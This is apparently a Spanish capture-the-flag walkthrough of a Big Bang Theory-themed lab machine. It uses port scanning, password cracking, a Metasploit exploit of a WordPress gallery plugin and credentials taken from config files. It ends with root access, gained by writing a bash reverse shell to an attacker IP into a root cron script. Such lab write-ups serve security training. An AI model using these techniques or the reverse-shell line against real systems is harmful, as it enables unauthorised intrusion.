# Maquina Fun Whit Flags:

Primeramente descubrimos la ip de la maquina mediante un escaneo a la subred:

```bash
·-$ nmap 10.32.2.0/24
```

Encontramos la direccion: 10.32.2.46

·-$ IP=10.32.2.46

le hacemos un escaneo de puertos con:

·-$ sudo nmap -sS -vvv -p- -n -Pn –open –min-rate 5000 $IP -oG nmap-report

y nos revela algunos puertos abiertos [21,22,80,1337] a los cuales le hacemos un escaneo un poco mas profundo en busca de posibles vulnerabilidades:

el mismo escaneo también nos devuelve la primera flag:

· FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}

También podemos obersvar el ftp corriendo en el puerto 21 con anonymous permitido y un par de cosas en él, así que empezaremos por aquí.





Vemos varias cosas, como un posible usuario y contraseña para penny (penny96, pennyisafreeloader), probamos por ssh pero no funciona asi que seguimos mirando.

En el directorio howard hay un comprimido .zip con contraseña, probamos fuerza bruta con fcrackzip y el diccionario rockyou.txt:


Encontramos la password: astronaut. El .zip nos devuelve una foto, que tras analizarla nos damos cuenta que contiene algo en ella, pero tambien necesitamos contraseña, por lo que probaremos fuerza bruta nuevamente, esta vez con stegcracker y nuevamente rockyou.txt:


Tenemos la flag de howard!:

· FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}

Ahora echemos un vistazo a la web.

Primeramente encontramos un robots.txt que no nos lleva a nada serio, asi que hacemos fuzzing de directorios con gobuster para listar posibles directorios y archivos:


Tenemos varias vias por donde buscar, pero antes haremos fuzzing tambien en los nuevos directorios (/music, /private y /phpmyadmin) donde encontramos varias cosas, como un wordpress con un panel de login (wp-login.php) dentro de /music/wordpress/:





Luego de intentar varias cosas como injecciones sql o usuarios por defecto, le hacemos un escaneo con wpscan (Wordpress Security Scan) y encontramos un plugin vulnerable que constituye una posible via de acceso y el cual intentaremos explotar con metasploit (plugin: reflex-gallery)

·-$ msfconsole
msf> search reflex
msf> use 0
msf> set RHOST 10.32.2.46
msf> set TARGETURI /music/wordpress
msf> run

Y estamos dentro!
Ahora, husmeando en varios archivos, principalmente en el directorio de wordpress, encontramos en wp-config.php credenciales de la base de datos, como por ejemplo:


// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'footprintsonthemoon' );

/** MySQL database username */
define( 'DB_USER', 'footprintsonthemoon' );

/** MySQL database password */
define( 'DB_PASSWORD', 'footprintsonthemoon1337' );

Primeramente encontramos algunos usuarios de wordpress, nada relevante, seguimos buscando tabla por tabla, y en wp-posts,  encontramos el contenido de varios de estos, donde el último contenía lo siguiente:

La flag de Raj(raz):

· FLAG-raz{40d17a74e28a62eac2df19e206f0987c}

Una vez terminada la enumeración de la base de datos, seguimos en el servidor y encontramos otras credenciales, ahora en /var/www/html/private/db_config.php:

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
$DBUSER = 'bigpharmacorp';
$DBPASS = 'weareevil';

Una vez en la base de datos tenemos lo siguiente:



· FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}

Siguiendo con las búsquedas, encontramos en el directorio amy, 2 archivos, “notes.txt” y y un binario ejecutable “secretdiary”. La nota tenia el siguiente texto:

This is my secret diary.
The safest way to keep my secrets is inside a compiled executable program.
As soon as I get popular now, that I have friends, I will start adding my secrets here.
I have used a really strong password that it cant be bruteforced.
Seriously it is 18 digit, alphanumeric, uppercase/lowercase with symbols.
And since my program is already compiled, no one can read the source code in order to view the password!

Lo primero que se me ocurre es leer con cat el binario en busca de algo raro, y tenemos lo siguiente:
asd
Tenemos la flag de amy y una posible password, con la cual intente entrar por ssh pero no funcionó, así que seguimos buscando e intentando escalar privilegios.

· FLAG-amy{60263777358690b90e8dbe8fea6943c9}


En el directorio leonard encontramos un script .sh, sobre el cual teniamos todos los permisos “thermostat_set_temp.sh”, al parecer es un cron que ejecuta root:
________________________________________________________________________________
root  2407  0.0  0.0   5436   724 ?   S  14:43   0:00 /bin/bash /home/leonard/thermostat_set_temp.sh
------------------------------------------------------------------------------------------------------------------------

Vamos a insertar una reverse shell en bash y esperar con netcat por el puerto 4444:

Lado de la máquina víctima:
·-$ echo "bash -i >& /dev/tcp/10.8.136.135/4444 0>&1" > thermostat_set_temp.sh

Máquina atacante:
·-$ nc -lnvp 4444

y al cabo de unos 8-10 segundos, somos root:

root@tbbt:/home/leonard#

en ~/ encontramos la flag de leonard:

FLAG-leonard{17fc95224b65286941c54747704acd3e}

y en /home/penny, con ls -a, encontramos el archivo “.FLAG.penny.txt”, con una cadena en aparentemente base64, la intentamos descifrar con:

root@tbbt:/home/leonard# cat .FLAG.penny.txt | base64 -d

y obtenemos la flag de penny:

· FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}



